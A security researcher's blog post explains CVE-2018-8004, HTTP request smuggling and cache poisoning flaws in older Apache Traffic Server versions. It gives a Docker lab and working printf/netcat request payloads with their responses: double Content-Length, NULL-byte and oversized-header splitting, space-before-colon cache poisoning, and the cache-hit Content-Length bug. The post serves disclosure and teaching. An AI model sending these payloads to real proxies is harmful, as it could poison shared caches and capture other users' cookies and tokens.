---
layout: post
uuid: 9dchfg-ebb4-2cdfe-586dcaa665ecec50f0
title: "Security: HTTP Smuggling, Apache Traffic Server"
categories: [english, Security]
tags: [Security, CVE, HTTP, Smuggling, Pound]
pic: old15.jpg
excerpt: details of CVE-2018-8004 (August 2018 - Apache Traffic Server).
---

<small>**English version** (**Version Française** disponible sur [makina corpus][FRENCH]).</small>
<small>estimated read time: 15 min to really more</small>

## What is this about ?

This article will give a deep explanation of HTTP Smuggling issues present in [CVE-2018-8004][CVE]. Firstly because there's currently not much informations about it (*"Undergoing Analysis"* at the time of this writing on the previous link). Secondly some time has passed since the official announce (and even more since the availability of fixs in v7), also mostly because I keep receiving demands on what exactly is HTTP Smuggling and how to test/exploit this type of issues, also beacause Smuggling issues are now trending and easier to test [thanks for the great stuff of James Kettle][DESYNC] ([@albinowax][ALBINOWAX]).

So, this time, I'll give you not only **details** but also a step by step **demo** with some **DockerFiles** to build your own test lab.
You could use that test lab to experiment it with manual raw queries, or test the recently added [BURP Suite][BURP] Smuggling tools. I'm really
a big partisan of always searching for Smuggling issues in non production environements, for legal reasons and also to avoid unattended
consequences (and we'll see in this article, with the last issue, that unattended behaviors can always happen).

## Apache Traffic Server ?

[Apache Traffic Server, or ATS][ATS] is an Open Source HTTP load balancer and Reverse Proxy Cache. Based on a Commercial product donated to the Apache Foundation. It's not related to Apache httpd HTTP server, the "Apache" name comes from the Apache foundation, the code is very different
from httpd.

If you were to search from ATS installations [on the wild][SHODAN] you would find some, hopefully fixed now.

### Fixed versions of ATS

As stated in the [CVE announce][CVE] (2018-08-28) impacted ATS versions are versions **6.0.0 to 6.2.2** and **7.0.0 to 7.1.3**. Version 7.1.4 was released in 2018-08-02 and 6.2.3 in 2018-08-04. That's the offical announce, but I think 7.1.3 contained most of the fixs already, and is maybe not vulnerable. The announce was mostly delayed for 6.x backports (and some other fixs are relased in the same time, on other issues).

If you wonder about previous versions, like 5.x, they're out of support, and quite certainly vulnerable. **Do not use out of support versions.**

## CVE-2018-8004

The [official CVE description][CVE] is:

> There are multiple HTTP smuggling and cache poisoning issues when clients making malicious requests interact with ATS.

Which does not gives a lot of pointers, but there's much more information in the 4 pull requests listed:

* [#3192: Return 400 if there is whitespace after the field name and before the colon][PULL_REQUEST_3192]
* [#3201: Close the connection when returning a 400 error response][PULL_REQUEST_3201]
* [#3231: Validate Content-Length headers for incoming requests ][PULL_REQUEST_3231]
* [#3251:  Drain the request body if there is a cache hit][PULL_REQUEST_3251]

If you already studied some of my previous posts, some of these sentences might already seems dubious. For example not closing a response stream after an error 400 is clearly a fault, based on the standards, but is also a good catch for an attacker. Chances are that crafting a bad messages chain you may succeed at receiving a response for some queries hidden in the body of an invalid request.

The last one, *Drain the request body if there is a cache hit* is the nicest one, as we will see on this article, and it was hard to detect.

My original report listed 5 issues:

* **HTTP request splitting** using NULL character in header value
* **HTTP request splitting** using huge header size
* **HTTP request splitting** using double Content-length headers
* **HTTP cache poisoning** using extra space before separator of header name and header value
* **HTTP request splitting** using ...*(no spoiler: I keep that for the end)*

## Step by step Proof of Concept

To understand the issues, and see the effects, We will be using a demonstration/research environment.

**If you either want to test HTTP Smuggling issues you should really, really, try to test it on a controlled environment. Testing issues on live environments would be difficult because:**

* **You may have some very good HTTP agents (load balancers, SSL terminators, security filters) between you and your target, hiding most of your success and errors.**
* **You may triggers errors and behaviors that you have no idea about, for example I have encountered random errors on several fuzzing tests (on test envs), unreproductible, before understanding that this was related to the last smuggling issue we will study on this article. Effects were delayed on subsequent tests, and I was not in control, at all.**
* **You may trigger errors on requests sent by other users, and/or for other domains. That's not like testing a self reflected XSS, you could end up in a court for that.**
* **Real life complete examples usually occurs with interactions between several different HTTP agents, like Nginx + Varnish, or ATS + HaProxy, or Pound + IIS + Nodejs, etc. You will have to understand how each actor interact with the other, and you will see it faster with a local low level network capture than blindly accross an unknown chain of agents (like for example to learn how to detect each agent on this chain).**

So it's very important to be able to rebuild a laboratory env.

And, if you find something, this env can then be used to send detailled bug reports to the program owners (in my own experience, it can sometimes be quite difficult to explain the issues, a working demo helps).

### Set-up the lab: Docker instances

We will run 2 Apache Traffic Server Instance, one in version 6.x and one in version 7.x.

To add some alterity, and potential smuggling issues, we will also add an Nginx docker, and an HaProy one.

4 HTTP actors, each one on a local port:

* **127.0.0.1:8001** : [HaProxy][HAPROXY] (internally listening on port **80**)
* **127.0.0.1:8002** : Nginx (internally listening on port **80**)
* **127.0.0.1:8007** : ATS7 (internally listening on port **8080**)
* **127.0.0.1:8006** : ATS6 (internally listening on port **8080**), most examples will use ATS7, but you will ba able to test this older version simply using this port instead of the other (and altering the domain).

We will chain some Reverse Proxy relations, Nginx will be the final backend, HaProxy the front load balancer, and between Nginx and HaProxy we will go through ATS6 or ATS7 based on the domain name used (**dummy-host7.example.com** for ATS7 and **dummy-host6.example.com** for ATS6)

Note that the **localhost port mapping** of the ATS and Nginx instances are not directly needed, if you can inject a request to Haproxy it will reach Nginx internally, via port 8080 of one of the ATS, and port 80 of Nginx. But that could be usefull if you want to target directly one of the server, and we will have to avoid the HaProxy part on most examples, because most attacks would be blocked by this load balancer. So most examples will directly target the ATS7 server first, on 8007. Later you can try to suceed targeting 8001, that will be harder.

                           +---[80]---+
                           | 8001->80 |
                           |  HaProxy |
                           |          |
                           +--+---+---+
    [dummy-host6.example.com] |   | [dummy-host7.example.com]
                      +-------+   +------+
                      |                  |
                  +-[8080]-----+     +-[8080]-----+
                  | 8006->8080 |     | 8007->8080 |
                  |  ATS6      |     |  ATS7      |
                  |            |     |            |
                  +-----+------+     +----+-------+
                        |               |
                        +-------+-------+
                                |
                           +--[80]----+
                           | 8002->80 |
                           |  Nginx   |
                           |          |
                           +----------+

To build this cluster we will use docker-compose, You can the find the <a href="//regilero.github.io/theme/resource/ats/docker-compose.yml">docker-compose.yml file here</a>, but the content is quite short:

{% highlight yaml %}
version: '3'
services:
  haproxy:
    image: haproxy:1.6
    build:
      context: .
      dockerfile: Dockerfile-haproxy
    expose:
      - 80
    ports:
      - "8001:80"
    links:
      - ats7:linkedats7.net
      - ats6:linkedats6.net
    depends_on:
      - ats7
      - ats6
  ats7:
    image: centos:7
    build:
      context: .
      dockerfile: Dockerfile-ats7
    expose:
      - 8080
    ports:
      - "8007:8080"
    depends_on:
      - nginx
    links:
      - nginx:linkednginx.net
  ats6:
    image: centos:7
    build:
      context: .
      dockerfile: Dockerfile-ats6
    expose:
      - 8080
    ports:
      - "8006:8080"
    depends_on:
      - nginx
    links:
      - nginx:linkednginx.net
  nginx:
    image: nginx:latest
    build:
      context: .
      dockerfile: Dockerfile-nginx
    expose:
      - 80
    ports:
      - "8002:80"
{% endhighlight %}

To make this work you will also need the 4 specific Dockerfiles:

* <a href="//regilero.github.io/theme/resource/ats/Dockerfile-haproxy">Docker-haproxy: an HaProxy Dockerfile, with the right conf</a>
* <a href="//regilero.github.io/theme/resource/ats/Dockerfile-nginx">Docker-nginx: A very simple Nginx Dockerfile with one index.html page</a>
* <a href="//regilero.github.io/theme/resource/ats/Dockerfile-ats7">Docker-ats7: An ATS 7.1.1 compiled from archive Dockerfile</a>
* <a href="//regilero.github.io/theme/resource/ats/Dockerfile-ats6">Docker-ats6: An ATS 6.2.2 compiled from archive Dockerfile</a>

Put all theses files (the `docker-compose.yml` and the `Dockerfile-*` files) into a working directory and run in this dir:

{% highlight bash %}
docker-compose build && docker-compose up
{% endhighlight %}

You can now take a **big break**, you are launching two compilations of ATS. Hopefully the next time a `up` will be enough, and even the `build` may not redo the compilation steps.

You can easily add another `ats7-fixed` element on the cluster, to test fixed version of ATS if you want. For now we will concentrate on detecting issues in flawed versions.

### Test That Everything Works

We will run **basic non attacking queries** on this installation, to check that everything is working, and to train ourselves on the `printf + netcat` way of running queries. We will not use curl or wget to run HTTP query, because that would be impossible to write bad queries. So we need to use low level string manipulations (with `printf` for example) and socket handling (with `netcat` -- or `nc` --).

Test Nginx (that's a one-liner splitted for readability):

{% highlight bash %}
printf 'GET / HTTP/1.1\r\n'\
'Host:dummy-host7.example.com\r\n'\
'\r\n'\
| nc 127.0.0.1 8002
{% endhighlight %}

You should get the `index.html` response, something like:

{% highlight http %}
HTTP/1.1 200 OK
Server: nginx/1.15.5
Date: Fri, 26 Oct 2018 15:28:20 GMT
Content-Type: text/html
Content-Length: 120
Last-Modified: Fri, 26 Oct 2018 14:16:28 GMT
Connection: keep-alive
ETag: "5bd321bc-78"
X-Location-echo: /
X-Default-VH: 0
Cache-Control: public, max-age=300
Accept-Ranges: bytes

$<html><head><title>Nginx default static page</title></head>
<body><h1>Hello World</h1>
<p>It works!</p>
</body></html>
{% endhighlight %}

Then test ATS7 and ATS6:

{% highlight bash %}
printf 'GET / HTTP/1.1\r\n'\
'Host:dummy-host7.example.com\r\n'\
'\r\n'\
| nc 127.0.0.1 8007

printf 'GET / HTTP/1.1\r\n'\
'Host:dummy-host6.example.com\r\n'\
'\r\n'\
| nc 127.0.0.1 8006
{% endhighlight %}

Then test HaProxy, altering the `Host` name should make the transit via ATS7 or ATS6 (check the `Server:` header response):

{% highlight bash %}
printf 'GET / HTTP/1.1\r\n'\
'Host:dummy-host7.example.com\r\n'\
'\r\n'\
| nc 127.0.0.1 8001

printf 'GET / HTTP/1.1\r\n'\
'Host:dummy-host6.example.com\r\n'\
'\r\n'\
| nc 127.0.0.1 8001
{% endhighlight %}

And now let's start a more complex HTTP stuff, we will make an **HTTP pipeline**, pipelining several queries and receiving several responses, as pipelining is the **root** of most smuggling attacks:

{% highlight bash %}
# send one pipelined chain of queries
printf 'GET /?cache=1 HTTP/1.1\r\n'\
'Host:dummy-host7.example.com\r\n'\
'\r\n'\
'GET /?cache=2 HTTP/1.1\r\n'\
'Host:dummy-host7.example.com\r\n'\
'\r\n'\
'GET /?cache=3 HTTP/1.1\r\n'\
'Host:dummy-host6.example.com\r\n'\
'\r\n'\
'GET /?cache=4 HTTP/1.1\r\n'\
'Host:dummy-host6.example.com\r\n'\
'\r\n'\
| nc 127.0.0.1 8001
{% endhighlight %}

This is **pipelining**, it's not only using **HTTP keepAlive**, because we send the chain of queries without waiting for the responses. See [my previous post][PREVIOUS_DETAILS] for detail on Keepalives and Pipelining.

You should get the **Nginx access log** on the docker-compose output, if you do not **rotate some arguments** in the query nginx wont get reached by your requests, because ATS is caching the result already (`CTRL+C` on the docker-compose output and `docker-compose up` will remove any cache).

## Request Splitting by Double Content-Length

Let's start a real play. That's the 101 of HTTP Smuggling. The *easy* vector. **Double Content-Length header support is strictly forbidden** by the [RFC 7230 3.3.3][RFC7230_3_3_3] (bold added):

> **4** If a message is received without Transfer-Encoding and with
>    either **multiple Content-Length header fields having differing
>    field-values** or a single Content-Length header field having an
>    invalid value, then the message framing is invalid and the
>    recipient **MUST treat it as an unrecoverable error**. If this is
>    a request message, the server MUST respond with a 400 (Bad Request)
>    status code and then close the connection.  If this is a response
>    message received by a proxy, the proxy MUST close the connection
>    to the server, discard the received response, and send a 502 (Bad
>    Gateway) response to the client.  If this is a response message
>    received by a user agent, the user agent MUST close the
>    connection to the server and discard the received response.

Differing interpretations of message length based on the order of Content-Length headers were the first demonstrated HTTP smuggling attacks (2005).

Sending such query directly on ATS generates 2 responses (one 400 and one 200):

{% highlight bash %}
printf 'GET /index.html?toto=1 HTTP/1.1\r\n'\
'Host: dummy-host7.example.com\r\n'\
'Content-Length: 0\r\n'\
'Content-Length: 66\r\n'\
'\r\n'\
'GET /index.html?toto=2 HTTP/1.1\r\n'\
'Host: dummy-host7.example.com\r\n'\
'\r\n'\
|nc -q 1 127.0.0.1 8007
{% endhighlight %}

The regular response should be one error 400.

Using port 8001 (HaProxy) would not work, HaProxy is a robust HTTP agent and cannot be fooled by such an easy trick.

This is **Critical** Request Splitting, classical, but hard to reproduce in real life environment if some robust tools are used on the reverse proxy chain. So, **why critical?** Because you could also consider ATS to be robust, and use a new unknown HTTP server behind or in front of ATS and expect such smuggling attacks to be properly detected.

And there is another factor of criticality, any other issue on HTTP parsing can exploit this Double Content-Length. Let's say you have another issue which allows you to hide one header for all other HTTP actors, but reveals this header to ATS. Then you just have to use this hidden header for a second Content-length and you're done, without being blocked by a previous actor. On our current case, ATS, you have one example of such hidden-header issue with the 'space-before-:' that we will analyze later.


## Request Splitting by NULL Character Injection

This example is not the easiest one to understand (go to the next one if you do not get it, or even the one after), that's also not the biggest impact, as we will use a really bad query to attack, easily detected. But I love the magical **NULL** (`\0`) character.

Using a NULL byte character in a header triggers a query rejection on ATS, that's ok, but also a **premature end of query**, and if you do not close pipelines after a first error, bad things could happen. Next line is interpreted as next query in pipeline.

So, a valid (almost, if you except the NULL character) pipeline like this one:

     01 GET /does-not-exists.html?foofoo=1 HTTP/1.1\r\n
     02 X-Something: \0 something\r\n
     03 X-Foo: Bar\r\n
     04 \r\n
     05 GET /index.html?bar=1 HTTP/1.1\r\n
     06 Host: dummy-host7.example.com\r\n
     07 \r\n

Generates 2 error 400. because the second query is starting with `X-Foo: Bar\r\n` and that's
an invalid first query line.

Let's test an invalid pipeline (as there'is no `\r\n` between the 2 queries):

     01 GET /does-not-exists.html?foofoo=2 HTTP/1.1\r\n
     02 X-Something: \0 something\r\n
     03 GET /index.html?bar=2 HTTP/1.1\r\n
     04 Host: dummy-host7.example.com\r\n
     05 \r\n

It generates 1 error 400 and one 200 OK response. Lines **03/04/05** are taken as a valid query.

This is already an HTTP request Splitting attack.

But line **03** is a really bad header line that most agent would reject. You cannot read that as a valid unique query. The fake pipeline would be detected early as a bad query, I mean line 03 is clearly not a valid header line.

    GET /index.html?bar=2 HTTP/1.1\r\n
     !=
    <HEADER-NAME-NO-SPACE>[:][SP]<HEADER-VALUE>[CR][LF]

For the first line the syntax is one of these two lines:

    <METHOD>[SP]<LOCATION>[SP]HTTP/[M].[m][CR][LF]
    <METHOD>[SP]<http[s]://LOCATION>[SP]HTTP/[M].[m][CR][LF] (absolute uri)

`LOCATION` may be used to inject the special `[:]` that is required in an header line, especially on the query string part,
but this would inject a lot of bad characters in the `HEADER-NAME-NO-SPACE` part, like '/' or '?'.

Let's try with the ABSOLUTE-URI alternative syntax, where the `[:]` comes faster on the line, and the only bad character for an Header name would be the space. This will also fix the potential presence of the double Host header (absolute uri does replace the Host header).

     01 GET /does-not-exists.html?foofoo=2 HTTP/1.1\r\n
     02 Host: dummy-host7.example.com\r\n
     03 X-Something: \0 something\r\n
     04 GET http://dummy-host7.example.com/index.html?bar=2 HTTP/1.1\r\n
     05 \r\n

Here the bad header which becomes a query is line **04**, and the **header name** is `GET http` with an header value of `//dummy-host7.example.com/index.html?bar=2 HTTP/1.1`. That's still an invalid header (the header name contains a space) but I'm pretty sure we could find some HTTP agent transferring this header (ATS is one proof of that, space character in header names were allowed).

A real attack using this trick will looks like this:

{% highlight bash %}
printf 'GET /something.html?zorg=1 HTTP/1.1\r\n'\
'Host: dummy-host7.example.com\r\n'\
'X-Something: "\0something"\r\n'\
'GET http://dummy-host7.example.com/index.html?replacing=1&zorg=2 HTTP/1.1\r\n'\
'\r\n'\
'GET /targeted.html?replaced=maybe&zorg=3 HTTP/1.1\r\n'\
'Host: dummy-host7.example.com\r\n'\
'\r\n'\
|nc -q 1 127.0.0.1 8007
{% endhighlight %}

This is just **2 queries** (1st one has 2 bad header, one with a NULL, one with a space in header name), for ATS it's **3 queries**.

The regular second one (`/targeted.html`) -- third for ATS --  will get the response of the hidden query (`http://dummy-host.example.com/index.html?replacing=1&zorg=2`). Check the `X-Location-echo:` added by Nginx. After that ATS adds a thirsr response, a 404, but the previous actor expects only 2 responses, and the second response **is already replaced**.

{% highlight http %}
HTTP/1.1 400 Invalid HTTP Request
Date: Fri, 26 Oct 2018 15:34:53 GMT
Connection: keep-alive
Server: ATS/7.1.1
Cache-Control: no-store
Content-Type: text/html
Content-Language: en
Content-Length: 220

<HTML>
<HEAD>
<TITLE>Bad Request</TITLE>
</HEAD>

<BODY BGCOLOR="white" FGCOLOR="black">
<H1>Bad Request</H1>
<HR>

<FONT FACE="Helvetica,Arial"><B>
Description: Could not process this request. 
</B></FONT>
<HR>
</BODY>
{% endhighlight %}

Then:

{% highlight http %}
HTTP/1.1 200 OK
Server: ATS/7.1.1
Date: Fri, 26 Oct 2018 15:34:53 GMT
Content-Type: text/html
Content-Length: 120
Last-Modified: Fri, 26 Oct 2018 14:16:28 GMT
ETag: "5bd321bc-78"
X-Location-echo: /index.html?replacing=1&zorg=2
X-Default-VH: 0
Cache-Control: public, max-age=300
Accept-Ranges: bytes
Age: 0
Connection: keep-alive

$<html><head><title>Nginx default static page</title></head>
<body><h1>Hello World</h1>
<p>It works!</p>
</body></html>
{% endhighlight %}

And then the extra unused response:

{% highlight http %}
HTTP/1.1 404 Not Found
Server: ATS/7.1.1
Date: Fri, 26 Oct 2018 15:34:53 GMT
Content-Type: text/html
Content-Length: 153
Age: 0
Connection: keep-alive

<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.15.5</center>
</body>
</html>

{% endhighlight %}

If you try to use port 8001 (so transit via HaProxy) you will not get the expected attacking result. That attacking query is really too bad.


{% highlight http %}
HTTP/1.0 400 Bad request
Cache-Control: no-cache
Connection: close
Content-Type: text/html

<html><body><h1>400 Bad request</h1>
Your browser sent an invalid request.
</body></html>
{% endhighlight %}

That's an HTTP request splitting attack, but real world usage may be hard to find.

The fix on ATS is the 'close on error', when an error 400 is triggered the pipelined is stopped, the socket is closed after the error.

## Request Splitting using Huge Header, Early End-Of-Query

This attack is almost the same as the previous one, but do not need the magical **NULL** character to trigger the end-of-query event.

By using headers with a size around **65536 characters** we can trigger this event, and exploit it the same way than the with the NULL premature end of query.

A note on printf huge header generation with `printf`. Here I'm generating a query with one header containing a lot of repeated characters (`=` or `1` for example):
    
    X: ==============( 65 532 '=' )========================\r\n

You can use the `%ns` form in printf to generate this, generating big number of spaces.

But to do that we need to replace some special characters with tr and use `_` instead of spaces in the original string:

{% highlight bash %}
printf 'X:_"%65532s"\r\n' | tr " " "=" | tr "_" " "
{% endhighlight %}

Try it against Nginx :

{% highlight bash %}
printf 'GET_/something.html?zorg=6_HTTP/1.1\r\n'\
'Host:_dummy-host7.example.com\r\n'\
'X:_"%65532s"\r\n'\
'GET_http://dummy-host7.example.com/index.html?replaced=0&cache=8_HTTP/1.1\r\n'\
'\r\n'\
|tr " " "1"\
|tr "_" " "\
|nc -q 1 127.0.0.1 8002
{% endhighlight %}

I gat one error 400, that's the normal stuff. It Nginx does not like huge headers.

Now try it against ATS7:

{% highlight bash %}
printf 'GET_/something.html?zorg2=5_HTTP/1.1\r\n'\
'Host:_dummy-host7.example.com\r\n'\
'X:_"%65534s"\r\n'\
'GET_http://dummy-host7.example.com/index.html?replaced=0&cache=8_HTTP/1.1\r\n'\
'\r\n'\
|tr " " "1"\
|tr "_" " "\
|nc -q 1 127.0.0.1 8007
{% endhighlight %}

And after the error 400 we have a **200 OK** response. Same problem as in the previous example, and same fix. Here we still have a query with a bad header containing a space, and also one quite big header but we do not have the NULL character. But, yeah, 65000 character is very big, most actors would reject a query after 8000 characters on one line.


{% highlight http %}
HTTP/1.1 400 Invalid HTTP Request
Date: Fri, 26 Oct 2018 15:40:17 GMT
Connection: keep-alive
Server: ATS/7.1.1
Cache-Control: no-store
Content-Type: text/html
Content-Language: en
Content-Length: 220

<HTML>
<HEAD>
<TITLE>Bad Request</TITLE>
</HEAD>

<BODY BGCOLOR="white" FGCOLOR="black">
<H1>Bad Request</H1>
<HR>

<FONT FACE="Helvetica,Arial"><B>
Description: Could not process this request. 
</B></FONT>
<HR>
</BODY>
{% endhighlight %}
{% highlight http %}
HTTP/1.1 200 OK
Server: ATS/7.1.1
Date: Fri, 26 Oct 2018 15:40:17 GMT
Content-Type: text/html
Content-Length: 120
Last-Modified: Fri, 26 Oct 2018 14:16:28 GMT
ETag: "5bd321bc-78"
X-Location-echo: /index.html?replaced=0&cache=8
X-Default-VH: 0
Cache-Control: public, max-age=300
Accept-Ranges: bytes
Age: 0
Connection: keep-alive

$<html><head><title>Nginx default static page</title></head>
<body><h1>Hello World</h1>
<p>It works!</p>
</body></html>
{% endhighlight %}

## Cache Poisoning using Incomplete Queries and Bad Separator Prefix

**Cache poisoning**, that's sound great. On smuggling attacks you should only have to trigger a request or response splitting attack to prove a defect, but when you push that to cache poisoning people usually understand better why splitted pipelines are dangerous.

ATS support an invalid header Syntax:

    HEADER[SPACE]:HEADER VALUE\r\n


That's not conform to [RFC7230 section 3.3.2][RFC7230_3_3_2]:

> Each header field consists of a case-insensitive field name followed
> by a colon (":"), optional leading whitespace, the field value, and
> optional trailing whitespace.

So :

    HEADER:HEADER_VALUE\r\n => OK
    HEADER:[SPACE]HEADER_VALUE\r\n => OK
    HEADER:[SPACE]HEADER_VALUE[SPACE]\r\n => OK
    HEADER[SPACE]:HEADER_VALUE\r\n => NOT OK

And [RFC7230 section 3.2.4][RFC7230_3_2_4] adds (bold added):

> **No whitespace is allowed between the header field-name and colon**.  In
> the past, differences in the handling of such whitespace have led to
> security vulnerabilities in request routing and response handling.  A
> server MUST reject any received request message that contains
> whitespace between a header field-name and colon with a response code
> of 400 (Bad Request). A proxy MUST remove any such whitespace from a
> response message before forwarding the message downstream.

ATS will interpret the bad header, and also forward it without alterations.

Using this flaw we can add some headers in our request that are **invalid** for any
valid HTTP agents but still interpreted by ATS like:

    Content-Length :77\r\n

Or (try it as an exercise)

    Transfer-encoding :chunked\r\n

Some HTTP servers will effectively reject such message with an error 400.
But some will simply *ignore* the invalid header. That's the case of Nginx for example.

ATS will maintain a keep-alive connection to the Nginx Backend, so we'll use this ignored header to transmit **a body** (ATS think it's a body) that is in fact **a new query** for the backend. And we'll make this query incomplete (missing a crlf
on end-of-header) to absorb a future query sent to Nginx. This sort of incomplete-query filled by the next coming query is also a basic Smuggling technique demonstrated 13 years ago.

    01 GET /does-not-exists.html?cache=x HTTP/1.1\r\n
    02 Host: dummy-host7.example.com\r\n
    03 Cache-Control: max-age=200\r\n
    04 X-info: evil 1.5 query, bad CL header\r\n
    05 Content-Length :117\r\n
    06 \r\n
    07 GET /index.html?INJECTED=1 HTTP/1.1\r\n
    08 Host: dummy-host7.example.com\r\n
    09 X-info: evil poisoning query\r\n
    10 Dummy-incomplete:

* Line **05** is invalid (' :'). But for ATS it is valid.
* Lines **07/08/09/10** are just binary body data for ATS transmitted to backend.

For Nginx:

* Line **05** is ignored.
* Line **07** is a new request (and first response is returned).
* Line **10** has no "\r\n". so Nginx is still waiting for the end of this query, on the keep-alive connection opened by ATS ...

### Attack schema

    [ATS Cache poisoning - space before header separator + backend ignoring bad headers]
    Innocent        Attacker           ATS            Nginx
        |               |               |               |
        |               |--A(1A+1/2B)-->|               | * Issue 1 & 2 *
        |               |               |--A(1A+1/2B)-->| * Issue 3 *
        |               |               |<-A(404)-------|
        |               |               |            [1/2B]
        |               |<-A(404)-------|            [1/2B]
        |               |--C----------->|            [1/2B]
        |               |               |--C----------->| * ending B *
        |               |            [*CP*]<--B(200)----|
        |               |<--B(200)------|               |
        |--C--------------------------->|               |
        |<--B(200)--------------------[HIT]             |

* 1A + 1/2B means request A + an incomplete query B
* A(X) : means X query is hidden in body of query A
* CP : Cache poisoning
* Issue 1 : ATS transmit 'header[SPACE]: Value', a bad HTTP header.
* Issue 2 : ATS interpret this bad header as valid (so 1/2B still hidden in body)
* Issue 3 : Nginx encounter the bad header but ignore the header instead of
            sending an error 400. So 1/2B is discovered as a new query (no Content-length)
            request B contains an incomplete header (no crlf)
* ending B: the 1st line of query C ends the incomplete header of query B.
            all others headers are added to the query. C disappears and mix C
            HTTP credentials with all previous B headers (cookie/bearer token/Host, etc.)

Instead of cache poisoning you could also play with the incomplete `1/B` query and wait for the Innocent query to finish this request with HTTP credentials of this user (cookies, HTTP Auth, JWT tokens, etc.). That would be another attack vector. Here we will *simply* demonstrate cache poisoning.

Run this attack:

{% highlight bash %}
for i in {1..9} ;do
printf 'GET /does-not-exists.html?cache='$i' HTTP/1.1\r\n'\
'Host: dummy-host7.example.com\r\n'\
'Cache-Control: max-age=200\r\n'\
'X-info: evil 1.5 query, bad CL header\r\n'\
'Content-Length :117\r\n'\
'\r\n'\
'GET /index.html?INJECTED='$i' HTTP/1.1\r\n'\
'Host: dummy-host7.example.com\r\n'\
'X-info: evil poisoning query\r\n'\
'Dummy-unterminated:'\
|nc -q 1 127.0.0.1 8007
done
{% endhighlight %}

It should work, Nginx adds an X-Location-echo header in this lab configuration, where we have
the first line of the query added on the response headers. This way we can observe that the second response is removing the real second query first line and replacing it with the hidden
first line.

On my case the last query response contained:

     X-Location-echo: /index.html?INJECTED=3

But this last query was `GET /index.html?INJECTED=9`.

You can check the cache content with:

{% highlight bash %}
for i in {1..9} ;do
printf 'GET /does-not-exists.html?cache='$i' HTTP/1.1\r\n'\
'Host: dummy-host7.example.com\r\n'\
'Cache-Control: max-age=200\r\n'\
'\r\n'\
|nc -q 1 127.0.0.1 8007
done
{% endhighlight %}

In my case I found 6 404 (regular) and 3 200 responses (ouch), the cache **is** poisoned.

If you want to go deeper in Smuggling understanding you should try to play with wireshark on this example. Do not forget to restart the cluster to empty the cache.

Here we did not played with a C query yet, the cache poisoning occurs on our A query. Unless you consider the `/does-not-exists.html?cache='$i'` as C queries. But you can easily try to inject a C query on this cluster, where Nginx as some waiting requests, try to get it poisoned with `/index.html?INJECTED=3` responses:

{% highlight bash %}
for i in {1..9} ;do
printf 'GET /innocent-C-query.html?cache='$i' HTTP/1.1\r\n'\
'Host: dummy-host7.example.com\r\n'\
'Cache-Control: max-age=200\r\n'\
'\r\n'\
|nc -q 1 127.0.0.1 8007
done
{% endhighlight %}

This may give you a touch on *real world* exploitations, you have to repeat the attack to obtain something. Vary the number of servers on the cluster, the pools settings on the various layers of reverse proxies, etc. Things get complex. The easiest attack is to be a **chaos generator** (defacement like or DOS), fine cache replacement of a target on the other hand requires fine study and a bit of luck.

Does this work on port 8001 with HaProxy? well, no, of course. Our header syntax **is invalid**. You would need to hide the bad query syntax from HaProxy, maybe using another smuggling issue, to hide this bad request in a body. Or you would need a load balancer which does not detect this invalid syntax. Note that in this example the nginx behavior on invalid header syntax (ignore it) is also not standard ([and wont be fixed, AFAIK][NGINX_ISSUE]).

This invalid space prefix problem is the same issue as Apache httpd in [CVE-2016-8743][CVE_2016_8743].

## HTTP Response Splitting: Content-Length Ignored on Cache Hit

Still there? Great! Because now is the nicest issue.

At least for me it was the nicest issue. Mainly because I've spend a lot of time around it without understanding it.

I was fuzzing ATS, and my fuzzer detected issues. Trying to reproduce I had failures, and success on previoulsy undetected issues, and back to step1. Issues you cannot reproduce, you start doubting that you saw it before. Suddenly you find it back, but then no, etc. And of course I was not searching the root cause on the right examples. I was for example triggering tests on bad chunked transmissions, or delayed chunks.

It was very a long (too long) time before I detected that all this was linked to the **cache hit/cache miss** status of my requests.

**On cache Hit Content-Length header on a GET query is not read.**

That's so easy when you know it... And exploitation is also quite easy.

*We can hide a second query in the first query body, and on cache Hit this body becomes a new query.*

This sort of query will get one response first (and, yes, that's only one query), on a second launch it will render two responses (so an HTTP request Splitting by definition):

    01 GET /index.html?cache=zorg42 HTTP/1.1\r\n
    02 Host: dummy-host7.example.com\r\n
    03 Cache-control: max-age=300\r\n
    04 Content-Length: 71\r\n
    05 \r\n
    06 GET /index.html?cache=zorg43 HTTP/1.1\r\n
    07 Host: dummy-host7.example.com\r\n
    08 \r\n

Line **04** is ignored on cache hit (only after the first run, then),
after that line **06** is now a new query and not just the 1st query body.

This HTTP query is valid, **THERE IS NO invalid HTTP syntax present.**
So it's quite easy to perform a successful complete Smuggling attack from this issue, even using HaProxy in front of ATS.

If HaProxy is configured to use a keep-alive connection to ATS we can fool the HTTP stream of HaProxy by sending a pipeline of two queries where ATS sees 3 queries:

### Attack schema

    [ATS HTTP-Splitting issue on Cache hit + GET + Content-Length]
    Something        HaProxy           ATS            Nginx
        |--A----------->|               |               |
        |               |--A----------->|               |
        |               |               |--A----------->|
        |               |            [cache]<--A--------|
        |               | (etc.) <------|               | warmup
    ---------------------------------------------------------
        |               |               |               | attack
        |--A(+B)+C----->|               |               |
        |               |--A(+B)+C----->|               |
        |               |             [HIT]             | * Bug *
        |               |<--A-----------|               | * B 'discovered' *
        |<--A-----------|               |--B----------->|
        |               |               |<-B------------|
        |               |<-B------------|               |
     [ouch]<-B----------|               |               | * wrong resp. *
        |               |               |--C----------->|
        |               |               |<--C-----------|
        |              [R]<--C----------|               | rejected

First, we need to init cache, we use port 8001 to get a stream HaProxy->ATS->Nginx.

{% highlight bash %}
printf 'GET /index.html?cache=cogip2000 HTTP/1.1\r\n'\
'Host: dummy-host7.example.com\r\n'\
'Cache-control: max-age=300\r\n'\
'Content-Length: 0\r\n'\
'\r\n'\
|nc -q 1 127.0.0.1 8001
{% endhighlight %}

You can run it two times and see that on a second time it does not reach the nginx `access.log`.

Then we attack HaProxy, or any other cache set in front of this HaProxy.
We use a pipeline of **2 queries**, ATS will send back **3 responses**.
If a keep-alive mode is present in front of ATS there is a security problem.
Here it's the case because we do not use `option: http-close` on HaProxy (which would prevent usage of pipelines).

{% highlight bash %}
printf 'GET /index.html?cache=cogip2000 HTTP/1.1\r\n'\
'Host: dummy-host7.example.com\r\n'\
'Cache-control: max-age=300\r\n'\
'Content-Length: 74\r\n'\
'\r\n'\
'GET /index.html?evil=cogip2000 HTTP/1.1\r\n'\
'Host: dummy-host7.example.com\r\n'\
'\r\n'\
'GET /victim.html?cache=zorglub HTTP/1.1\r\n'\
'Host: dummy-host7.example.com\r\n'\
'\r\n'\
|nc -q 1 127.0.0.1 8001
{% endhighlight %}

